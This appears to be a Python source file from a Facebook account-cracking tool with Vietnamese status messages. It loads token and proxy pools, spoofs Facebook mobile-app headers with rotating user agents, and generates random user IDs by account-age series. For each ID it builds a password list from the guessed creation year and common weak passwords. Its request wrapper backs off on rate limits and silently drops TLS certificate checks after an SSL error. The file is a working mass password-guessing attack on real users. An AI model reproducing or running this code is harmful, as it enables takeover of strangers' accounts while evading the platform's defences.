# ── loaders ──────────────────────────────────────────────────────────────────
def load_tokens():
    global token_pool
    loaded = BUILTIN_TOKENS[:]
    used_builtin = True
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
        if lines:
            loaded = lines
            used_builtin = False
    with pool_lock:
        token_pool = loaded
        count = len(token_pool)
    if not used_builtin:
        print(f"{GREEN}[+] Loaded {count} tokens tu file{RESET}")
    else:
        print(f"{YELLOW}[!] Dung builtin tokens ({count}){RESET}")

def load_proxies():
    global proxy_pool
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
        with pool_lock:
            proxy_pool = lines
            count = len(proxy_pool)
        if count > 0:
            print(f"{GREEN}[+] Loaded {count} proxies{RESET}")
            return
    with pool_lock:
        proxy_pool = []
    print(f"{YELLOW}[!] Khong co proxy file — chay direct{RESET}")

# ── helpers ───────────────────────────────────────────────────────────────────
def get_token():
    with pool_lock:
        if token_pool:
            return random.choice(token_pool)
        return BUILTIN_TOKENS[0]

def get_proxy():
    with pool_lock:
        if not proxy_pool:
            return None
        p = random.choice(proxy_pool)
    return {'http': p, 'https': p}

def get_session():
    sess = getattr(local_state, 'session', None)
    if sess is None:
        sess = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=16, pool_maxsize=16, max_retries=0)
        sess.mount('http://', adapter)
        sess.mount('https://', adapter)
        local_state.session = sess
    return sess

def get_headers():
    return {
        'User-Agent':              random.choice(UA_LIST),
        'Accept':                  'application/json',
        'Accept-Language':         'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'X-FB-Connection-Type':    'WIFI',
        'X-FB-Net-HNI':            str(random.randint(40000, 50000)),
        'X-FB-SIM-HNI':            str(random.randint(40000, 50000)),
        'X-FB-Connection-Quality': 'EXCELLENT',
        'X-FB-HTTP-Engine':        'Liger',
        'Content-Type':            'application/x-www-form-urlencoded',
    }

def jitter(base=0.01, spread=0.02):
    if base > 0 or spread > 0:
        time.sleep(base + random.uniform(0, spread))

def guess_year(uid):
    uid = str(uid).strip()
    prefixes = {
        '100000': '2009-2010', '100001': '2010',
        '100002': '2011',      '100003': '2011',
        '100004': '2012',      '100005': '2013',
        '100006': '2013',      '100007': '2014',
        '100008': '2014',      '100009': '2015',
        '6155':   '2023-2024', '6156':   '2024+',
    }
    for p, y in prefixes.items():
        if uid.startswith(p):
            return y
    try:
        n = int(uid)
        if n < 1_000_000:       return '2004-2005'
        if n < 50_000_000:      return '2006-2007'
        if n < 1_000_000_000:   return '2008-2009'
        return '2009+'
    except ValueError:
        return 'Unknown'

def generate_uid(series=None):
    r = random.choices
    if series == '2009-2010':
        sub = random.choice(['0', '1'])
        return '10000' + sub + ''.join(r('0123456789', k=9))
    if series == '2011-2012':
        sub = random.choice(['2', '3', '4'])
        return '10000' + sub + ''.join(r('0123456789', k=9))
    if series == '2013-2014':
        sub = random.choice(['5', '6', '7', '8'])
        return '10000' + sub + ''.join(r('0123456789', k=9))
    if series == '2015':
        return '100009' + ''.join(r('0123456789', k=8))
    if series == 'old':
        return str(random.randint(1_000, 999_999_999))
    sub = random.choice('123456789')
    return '10000' + sub + ''.join(r('0123456789', k=9))

def build_password_list(uid):
    year = guess_year(uid)
    ordered = []
    seen = set()

    def add_pwd(item):
        if item and item not in seen:
            seen.add(item)
            ordered.append(item)

    if year and year[0].isdigit():
        y = year[:4]
        for cand in (y, y[2:], y + '123', '123' + y):
            add_pwd(cand)

    for pwd in WEAK_PASSWORDS:
        add_pwd(pwd)

    return ordered

# ── API calls ─────────────────────────────────────────────────────────────────
def _post(url, data=None, params=None):
    global request_count, rate_limited, verify_tls
    with req_lock:
        request_count += 1
    with tls_lock:
        current_verify = verify_tls

    sess = get_session()
    try:
        if data is not None:
            r = sess.post(
                url,
                data=data,
                params=params,
                headers=get_headers(),
                proxies=get_proxy(),
                timeout=TIMEOUT,
                verify=current_verify,
            )
        else:
            r = sess.get(
                url,
                params=params,
                headers=get_headers(),
                proxies=get_proxy(),
                timeout=TIMEOUT,
                verify=current_verify,
            )

        if r.status_code == 429:
            with scan_lock:
                rate_limited += 1
            time.sleep(random.uniform(1.5, 3.0))
            return {'error': 'rate_limited', 'status_code': 429}

        try:
            payload = r.json()
        except ValueError:
            return {
                'error': 'non_json_response',
                'status_code': r.status_code,
                'raw_text': r.text[:300],
            }

        if isinstance(payload, dict):
            payload.setdefault('_http_status', r.status_code)
            return payload
        return {'data': payload, '_http_status': r.status_code}
    except requests.exceptions.SSLError as e:
        if current_verify:
            with tls_lock:
                verify_tls = False
        return {'error': 'ssl_error', 'detail': str(e)}
    except requests.exceptions.RequestException as e:
        return {'error': 'network_error', 'detail': str(e)}
    except Exception as e:
        return {'error': 'unexpected_error', 'detail': str(e)}

